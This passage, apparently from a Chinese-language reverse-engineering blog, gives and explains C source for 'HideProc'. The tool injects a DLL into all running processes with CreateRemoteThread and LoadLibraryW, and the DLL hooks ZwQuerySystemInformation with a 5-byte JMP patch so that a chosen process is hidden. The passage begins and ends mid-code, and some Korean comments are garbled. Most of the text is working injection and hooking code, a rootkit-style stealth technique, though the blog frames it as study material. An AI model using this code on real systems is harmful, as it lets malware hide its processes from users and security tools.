class="line">                                MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">WriteProcessMemory(hProcess, pRemoteBuf, </span><br><span class="line">                       (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pThreadProc = (LPTHREAD_START_ROUTINE)</span><br><span class="line">                  GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), </span><br><span class="line">                                 <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">VirtualFreeEx(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">BOOL                    bMore = FALSE, bFound = FALSE;</span><br><span class="line">HANDLE                  hSnapshot, hProcess, hThread;</span><br><span class="line">MODULEENTRY32           me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( INVALID_HANDLE_VALUE == </span><br><span class="line">        (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line"><span class="keyword">for</span>( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( !_tcsicmp(me.szModule, szDllPath) || </span><br><span class="line">            !_tcsicmp(me.szExePath, szDllPath) )</span><br><span class="line">&#123;</span><br><span class="line">bFound = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !bFound )</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pThreadProc = (LPTHREAD_START_ROUTINE)</span><br><span class="line">                  GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), </span><br><span class="line">                                 <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectAllProcess</span><span class="params">(<span class="type">int</span> nMode, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD                   dwPID = <span class="number">0</span>;</span><br><span class="line">HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">PROCESSENTRY32          pe;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the snapshot of the system</span></span><br><span class="line">pe.dwSize = <span class="keyword">sizeof</span>( PROCESSENTRY32 );</span><br><span class="line">hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// find process</span></span><br><span class="line">Process32First(hSnapShot, &amp;pe);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">dwPID = pe.th32ProcessID;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ½Ã½ºÅÛÀÇ ¾ÈÁ¤¼ºÀ» À§ÇØ¼­</span></span><br><span class="line">        <span class="comment">// PID °¡ 100 º¸´Ù ÀÛÀº ½Ã½ºÅÛ ÇÁ·Î¼¼½º¿¡ ´ëÇØ¼­´Â</span></span><br><span class="line">        <span class="comment">// DLL Injection À» ¼öÇàÇÏÁö ¾Ê´Â´Ù.</span></span><br><span class="line"><span class="keyword">if</span>( dwPID &lt; <span class="number">100</span> )</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( nMode == INJECTION_MODE )</span><br><span class="line">    InjectDll(dwPID, szDllPath);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            EjectDll(dwPID, szDllPath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>( Process32Next(hSnapShot, &amp;pe) );</span><br><span class="line"></span><br><span class="line">CloseHandle(hSnapShot);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>                     nMode = INJECTION_MODE;</span><br><span class="line">    HMODULE                 hLib = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_SetProcName         SetProcName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( argc != <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;</span>\</span><br><span class="line">               <span class="string">&quot;&lt;process name&gt; &lt;dll path&gt;\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change privilege</span></span><br><span class="line">    SetPrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load library</span></span><br><span class="line">    hLib = LoadLibrary(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set process name to hide</span></span><br><span class="line">    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, <span class="string">&quot;SetProcName&quot;</span>);</span><br><span class="line">    SetProcName(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Inject(Eject) Dll to all process</span></span><br><span class="line">    <span class="keyword">if</span>( !_tcsicmp(argv[<span class="number">1</span>], <span class="string">L&quot;-show&quot;</span>) )</span><br><span class="line">    nMode = EJECTION_MODE;</span><br><span class="line"></span><br><span class="line">    InjectAllProcess(nMode, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free library</span></span><br><span class="line">    FreeLibrary(hLib);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分部分对HideProc的源码进行分析：</p><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>                     nMode = INJECTION_MODE;</span><br><span class="line">    HMODULE                 hLib = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_SetProcName         SetProcName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( argc != <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;</span>\</span><br><span class="line">               <span class="string">&quot;&lt;process name&gt; &lt;dll path&gt;\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change privilege</span></span><br><span class="line">    SetPrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load library</span></span><br><span class="line">    hLib = LoadLibrary(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set process name to hide</span></span><br><span class="line">    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, <span class="string">&quot;SetProcName&quot;</span>);</span><br><span class="line">    SetProcName(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Inject(Eject) Dll to all process</span></span><br><span class="line">    <span class="keyword">if</span>( !_tcsicmp(argv[<span class="number">1</span>], <span class="string">L&quot;-show&quot;</span>) )</span><br><span class="line">    nMode = EJECTION_MODE;</span><br><span class="line"></span><br><span class="line">    InjectAllProcess(nMode, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free library</span></span><br><span class="line">    FreeLibrary(hLib);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第7-12行，完成的是对参数的检测。第一个参数是启用的模式:一个是隐藏进程模式，一个是取消隐藏模式； 第二个参数是想要隐藏的进程名；第三个参数是注入的DLL文件。</li><li>第15行，提升权限</li><li>第18-22行，完成DLL的载入，并指定将隐藏的进程的。</li><li>第25-28行，根据启用的模式调用<code>InjectAllProcess</code></li></ul><h5 id="InjectAllProcess"><a href="#InjectAllProcess" class="headerlink" title="InjectAllProcess"></a>InjectAllProcess</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InjectAllProcess</span><span class="params">(<span class="type">int</span> nMode, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD                   dwPID = <span class="number">0</span>;</span><br><span class="line">HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">PROCESSENTRY32          pe;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the snapshot of the system</span></span><br><span class="line">pe.dwSize = <span class="keyword">sizeof</span>( PROCESSENTRY32 );</span><br><span class="line">hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// find process</span></span><br><span class="line">Process32First(hSnapShot, &amp;pe);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">dwPID = pe.th32ProcessID;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ½Ã½ºÅÛÀÇ ¾ÈÁ¤¼ºÀ» À§ÇØ¼­</span></span><br><span class="line">        <span class="comment">// PID &lt; 100是系统比较重要的进程，最好不干涉</span></span><br><span class="line">        <span class="comment">// DLL Injection À» ¼öÇàÇÏÁö ¾Ê´Â´Ù.</span></span><br><span class="line"><span class="keyword">if</span>( dwPID &lt; <span class="number">100</span> )</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( nMode == INJECTION_MODE )</span><br><span class="line">    InjectDll(dwPID, szDllPath);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            EjectDll(dwPID, szDllPath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>( Process32Next(hSnapShot, &amp;pe) );</span><br><span class="line"></span><br><span class="line">CloseHandle(hSnapShot);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成的内容是使用<code>CreateToolhelp32Snapshot</code> &amp; <code>Process32First</code> &amp; <code>Process32Next</code>遍历获取到的进程快照，比对是否为目标进程对应的PID。第23-26行，根据nMod的不同，调用不同的接口。</p><h5 id="InjectDll"><a href="#InjectDll" class="headerlink" title="InjectDll"></a>InjectDll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE                  hProcess, hThread;</span><br><span class="line">    LPVOID                  pRemoteBuf;</span><br><span class="line">DWORD             dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, </span><br><span class="line">                                MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">WriteProcessMemory(hProcess, pRemoteBuf, </span><br><span class="line">                       (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pThreadProc = (LPTHREAD_START_ROUTINE)</span><br><span class="line">                  GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), </span><br><span class="line">                                 <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">VirtualFreeEx(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第8-12行，使用<code>OpenProcess</code>以设置好的参数（PROCESS_ALL_ACCESS权限）尝试打开目标进程。</li><li>第14-18行，当<code>OpenProcess</code>成功打开目标进程，则在进程内部开辟一段足够存放待注入DLL路径信息的空间（具备写入等权限）起始地址为<code>pRemoteBuf</code>，之所以能开辟是由于在main中提升了权限。</li><li>第20-24行，先是使用<code>GetProcAddress</code>获取<code>Kernel32.LoadLibraryw</code> API的地址存放在<code>pThreadProc</code>中，随后调用<code>CreateRemoteThread</code>，开辟的线程去执行<code>LoadLibraryw</code> 调用，传递给<code>LoadLibraryw</code> 的参数是写入DLL路径的地址空间<code>LoadLibraryw</code> ，线程执行即可完成dll的载入。</li><li>之后的内容就是等待线程执行结束，释放开辟出来的内存空间，关闭相关句柄等</li></ul><h4 id="DLL-part"><a href="#DLL-part" class="headerlink" title="DLL part"></a>DLL part</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS(0x00000000L) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    SystemBasicInformation = <span class="number">0</span>,</span><br><span class="line">    SystemPerformanceInformation = <span class="number">2</span>,</span><br><span class="line">    SystemTimeOfDayInformation = <span class="number">3</span>,</span><br><span class="line">    SystemProcessInformation = <span class="number">5</span>,</span><br><span class="line">    SystemProcessorPerformanceInformation = <span class="number">8</span>,</span><br><span class="line">    SystemInterruptInformation = <span class="number">23</span>,</span><br><span class="line">    SystemExceptionInformation = <span class="number">33</span>,</span><br><span class="line">    SystemRegistryQuotaInformation = <span class="number">37</span>,</span><br><span class="line">    SystemLookasideInformation = <span class="number">45</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    BYTE Reserved4[<span class="number">4</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">11</span>];</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved6[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(WINAPI *PFZWQUERYSYSTEMINFORMATION)</span></span><br><span class="line">                 <span class="params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span><br><span class="line"><span class="params">                  PVOID SystemInformation, </span></span><br><span class="line"><span class="params">                  ULONG SystemInformationLength, </span></span><br><span class="line"><span class="params">                  PULONG ReturnLength)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_NTDLL                       (<span class="string">&quot;ntdll.dll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_ZWQUERYSYSTEMINFORMATION    (<span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// global variable (in sharing memory)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:.SHARE,RWS&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">    TCHAR g_szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// global variable</span></span><br><span class="line">BYTE g_pOrgBytes[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    FARPROC pfnOrg;</span><br><span class="line">    DWORD dwOldProtect, dwAddress;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÈÄÅ· ´ë»ó API ÁÖ¼Ò¸¦ ±¸ÇÑ´Ù</span></span><br><span class="line">    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pfnOrg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ¸¸¾à ÀÌ¹Ì ÈÄÅ· µÇ¾î ÀÖ´Ù¸é return FALSE</span></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5 byte ÆÐÄ¡¸¦ À§ÇÏ¿© ¸Þ¸ð¸®¿¡ WRITE ¼Ó¼º Ãß°¡</span></span><br><span class="line">    VirtualProtect((LPVOID)pfnOrg, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ±âÁ¸ ÄÚµå (5 byte) ¹é¾÷</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pOrgBytes, pfnOrg, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// JMP ÁÖ¼Ò °è»ê (E9 XXXX)</span></span><br><span class="line">    <span class="comment">// =&gt; XXXX = pfnNew - pfnOrg - 5</span></span><br><span class="line">    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hook - 5 byte ÆÐÄ¡ (JMP XXXX)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOrg, pBuf, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼º º¹¿ø</span></span><br><span class="line">    VirtualProtect((LPVOID)pfnOrg, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    FARPROC 